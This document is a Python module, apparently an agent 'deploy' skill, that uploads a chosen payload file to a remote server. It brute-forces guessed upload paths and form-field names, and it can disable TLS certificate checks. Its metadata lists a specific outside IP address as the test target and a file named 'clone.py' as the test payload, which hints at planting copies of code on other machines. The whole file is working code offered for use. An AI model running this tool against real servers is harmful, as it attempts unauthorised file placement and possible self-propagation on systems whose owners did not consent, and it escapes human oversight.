"""skill/deploy_http_post_multipart.py - 使用HTTP POST多部分表单上传payload到远程路径

SKILL_META:
{
  "name": "deploy_http_post_multipart",
  "description": "使用HTTP POST多部分表单上传payload到远程路径",
  "category": "deploy",
  "test_target": "209.51.188.20:443 /pub",
  "test_args": "--host 209.51.188.20 --port 443 --path /pub --payload_file clone.py --ignore_ssl",
  "version": "14.0"
}
"""
from __future__ import annotations

import argparse, json, os, ssl, sys, http.client, mimetypes
from typing import Any, Optional
from urllib.parse import urlparse

PATH_VARIANTS = ["", "/upload", "/uploads", "/files", "/data", "/api/upload", "/pub", "/pub/upload", "/pub/incoming", "/pub/files", "/incoming", "/upload/pub"]
DEFAULT_FIELDS = ["file", "upload_file", "file_upload", "Filedata", "attachment"]
ROOT_VARIANTS = ["", "/", "/index.php", "/upload.php", "/upload"]

def build_multipart_body(fields: dict, boundary: Optional[str] = None) -> tuple[bytes, str]:
    if boundary is None:
        boundary = "----FormBoundary" + os.urandom(16).hex()
    body = b""
    for name, (filename, content, content_type) in fields.items():
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
        body += f"Content-Type: {content_type}\r\n\r\n".encode()
        body += content + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return body, boundary

def send_request(conn, method, path, body, headers, timeout=30, debug=False):
    redirect_history = []
    current_path = path
    current_conn = conn
    for _ in range(6):
        try:
            if debug:
                print(f"[DEBUG] {method} {current_path}")
            current_conn.request(method, current_path, body, headers)
            response = current_conn.getresponse()
            status = response.status
            response_body = response.read().decode("utf-8", errors="replace")
            response_headers = dict(response.getheaders())
            if debug:
                print(f"[DEBUG] Status: {status}")
            if status in (301, 302, 303, 307, 308):
                location = response.getheader("Location") or response.getheader("location")
                if location:
                    redirect_history.append(f"{status} -> {location}")
                    parsed = urlparse(location)
                    if parsed.netloc:
                        host_port = parsed.netloc.split(":")
                        new_host = host_port[0]
                        new_port = int(host_port[1]) if len(host_port) > 1 else 443
                        current_conn.close()
                        context = current_conn.context if hasattr(current_conn, 'context') else None
                        use_ssl = context is not None
                        if use_ssl:
                            current_conn = http.client.HTTPSConnection(new_host, new_port, timeout=timeout, context=context)
                        else:
                            current_conn = http.client.HTTPConnection(new_host, new_port, timeout=timeout)
                        current_path = parsed.path or "/"
                    else:
                        current_path = parsed.path if parsed.path else "/"
                        if not current_path.startswith("/"):
                            current_path = "/" + current_path
                    continue
            return status, response_body, redirect_history, response_headers
        except http.client.HTTPException as e:
            return 0, str(e), redirect_history, {}
    return 508, "Too many redirects", redirect_history, {}

def try_upload_paths(host, port, base_path, filename, body, boundary, debug=False, timeout=30, ssl_context=None):
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}", "Content-Length": str(len(body))}
    paths_to_try = []
    if not base_path.endswith("/"):
        base_path += "/"
    for suffix in PATH_VARIANTS:
        paths_to_try.append(base_path + filename if suffix == "" else base_path + suffix.lstrip("/") + "/" + filename)
    seen = set()
    unique_paths = [p for p in paths_to_try if not (p in seen or seen.add(p))]
    results = []
    for path in unique_paths:
        try:
            if ssl_context:
                conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ssl_context)
            else:
                conn = http.client.HTTPConnection(host, port, timeout=timeout)
            response_code, response_body, redirect_history, response_headers = send_request(conn, "POST", path, body, headers, timeout, debug)
            conn.close()
            results.append({"path": path, "response_code": response_code, "response_body": response_body, "redirect_history": redirect_history, "response_headers": response_headers})
            if debug:
                print(f"[DEBUG] Tried {path}: {response_code}")
            if 200 <= response_code < 300:
                return {"success": True, "response_code": response_code, "message": response_body[:500] if response_body else "Upload success", "redirect_history": redirect_history, "used_path": path, "all_attempts": results}
            if response_code == 404 and base_path != "/":
                for root in ROOT_VARIANTS:
                    root_path = root + "/" + filename if root else "/" + filename
                    try:
                        if ssl_context:
                            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ssl_context)
                        else:
                            conn = http.client.HTTPConnection(host, port, timeout=timeout)
                        response_code, response_body, redirect_history, response_headers = send_request(conn, "POST", root_path, body, headers, timeout, debug)
                        conn.close()
                        results.append({"path": root_path, "response_code": response_code, "response_body": response_body, "redirect_history": redirect_history, "response_headers": response_headers})
                        if debug:
                            print(f"[DEBUG] Retry {root_path}: {response_code}")
                        if 200 <= response_code < 300:
                            return {"success": True, "response_code": response_code, "message": response_body[:500] if response_body else "Upload success", "redirect_history": redirect_history, "used_path": root_path, "all_attempts": results}
                    except Exception as e:
                        results.append({"path": root_path, "error": str(e)})
        except Exception as e:
            results.append({"path": path, "error": str(e)})
    return {"success": False, "response_code": results[-1].get("response_code", 0) if results else 0, "message": "All path variants failed", "redirect_history": [], "used_path": "", "all_attempts": results}

def create_dummy_payload(filename="dummy_payload.py") -> str:
    content = "#!/usr/bin/env python3\nprint('Hello from dummy payload')\n"
    filepath = os.path.join(os.getcwd(), filename)
    with open(filepath, "w") as f:
        f.write(content)
    return filepath

def main(*args, **kwargs) -> dict:
    result = {"success": False, "response_code": 0, "message": "", "redirect_history": [], "error_detail": {}}
    parser = argparse.ArgumentParser(description="HTTP POST multipart upload")
    parser.add_argument("--host", help="Target host IP or URL")
    parser.add_argument("--port", type=int, default=None, help="Target port")
    parser.add_argument("--path", help="Upload path")
    parser.add_argument("--payload_file", help="Payload file to upload")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    parser.add_argument("--timeout", type=int, default=30, help="Connection timeout")
    parser.add_argument("--file_field", help="Custom form field name")
    parser.add_argument("--scheme", choices=["http", "https"], default="http", help="HTTP scheme")
    parser.add_argument("--ignore_ssl_verify", "--ignore_ssl", action="store_true", help="Ignore SSL verification")

    if args:
        sys.argv = ["prog"] + list(args)

    try:
        parsed_args = parser.parse_args()
    except SystemExit:
        parsed_args = None

    host_input = kwargs.get("host") or ""
    port = kwargs.get("port")
    path = kwargs.get("path") or ""
    payload_file = kwargs.get("payload_file") or ""
    debug = kwargs.get("debug", False)
    timeout = kwargs.get("timeout", 30)
    file_field = kwargs.get("file_field") or ""
    scheme = kwargs.get("scheme", "http")
    ignore_ssl_verify = kwargs.get("ignore_ssl_verify", False) or kwargs.get("ignore_ssl", False)

    if parsed_args:
        host_input = host_input or parsed_args.host or ""
        if port is None:
            port = parsed_args.port
        path = path or parsed_args.path or ""
        payload_file = payload_file or parsed_args.payload_file or ""
        debug = debug or parsed_args.debug
        timeout = timeout or parsed_args.timeout or 30
        file_field = file_field or parsed_args.file_field or ""
        scheme = scheme or parsed_args.scheme or "http"
        ignore_ssl_verify = ignore_ssl_verify or parsed_args.ignore_ssl_verify

    use_https = scheme == "https"
    if host_input.startswith("https://"):
        use_https = True
        parsed = urlparse(host_input)
        host_input = parsed.netloc or parsed.hostname or ""
        if port is None and parsed.port:
            port = parsed.port
        if not path and parsed.path:
            path = parsed.path
    elif host_input.startswith("http://"):
        use_https = False
        parsed = urlparse(host_input)
        host_input = parsed.netloc or parsed.hostname or ""
        if port is None and parsed.port:
            port = parsed.port
        if not path and parsed.path:
            path = parsed.path

    if not host_input or not path:
        result["message"] = "Missing required arguments: host, path"
        return result

    ssl_context = None
    if use_https or (port is not None and port == 443):
        try:
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            if ignore_ssl_verify:
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                if debug:
                    print("[DEBUG] SSL verification disabled")
            else:
                ssl_context.check_hostname = True
                ssl_context.verify_mode = ssl.CERT_REQUIRED
        except Exception as e:
            result["message"] = f"SSL context creation failed: {e}"
            return result

    if port is None:
        port = 443 if use_https else 80

    filename = os.path.basename(payload_file) if payload_file else "dummy_payload.py"
    if not payload_file or not os.path.exists(payload_file):
        try:
            payload_file = create_dummy_payload(filename)
            result["info"] = f"Created dummy payload: {payload_file}"
        except Exception as e:
            result["message"] = f"Failed to create dummy payload: {e}"
            result["error_detail"] = {"error_type": "file_creation", "detail": str(e)}
            return result
    try:
        with open(payload_file, "rb") as f:
            file_content = f.read()
        content_type = mimetypes.guess_type(payload_file)[0] or "application/octet-stream"
        fields_to_try = [file_field] if file_field else DEFAULT_FIELDS
        last_result = None
        for field_name in fields_to_try:
            fields = {field_name: (filename, file_content, content_type)}
            body, boundary = build_multipart_body(fields)
            result = try_upload_paths(host_input, port, path, filename, body, boundary, debug, timeout, ssl_context)
            if result["success"]:
                result["file_field_used"] = field_name
                result["scheme_used"] = "https" if use_https else "http"
                result["ignore_ssl_verify"] = ignore_ssl_verify
                return result
            last_result = result
        if last_result:
            attempts = last_result.get("all_attempts", [])
            error_paths = [{"path": a.get("path"), "code": a.get("response_code"), "error": a.get("error")} for a in attempts]
            last_result["error_detail"] = {"status_text": http.client.responses.get(last_result["response_code"], "Unknown"), "attempts_count": len(attempts), "failed_paths": error_paths[-5:] if len(error_paths) > 5 else error_paths, "tried_fields": fields_to_try, "scheme": "https" if use_https else "http", "ignore_ssl_verify": ignore_ssl_verify}
            return last_result
    except FileNotFoundError as e:
        result["message"] = f"File error: {e}"
        result["error_detail"] = {"error_type": "file_not_found", "detail": str(e)}
    except ConnectionRefusedError as e:
        result["message"] = f"Connection refused: {e}"
        result["error_detail"] = {"error_type": "connection_refused", "detail": str(e)}
    except TimeoutError as e:
        result["message"] = f"Connection timeout: {e}"
        result["error_detail"] = {"error_type": "timeout", "detail": str(e)}
    except OSError as e:
        result["message"] = f"Network error: {e}"
        result["error_detail"] = {"error_type": "network", "detail": str(e)}
    except Exception as e:
        result["message"] = f"Unexpected error: {e}"
        result["error_detail"] = {"error_type": "unknown", "detail": str(e)}
    return result

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, ensure_ascii=False, indent=2))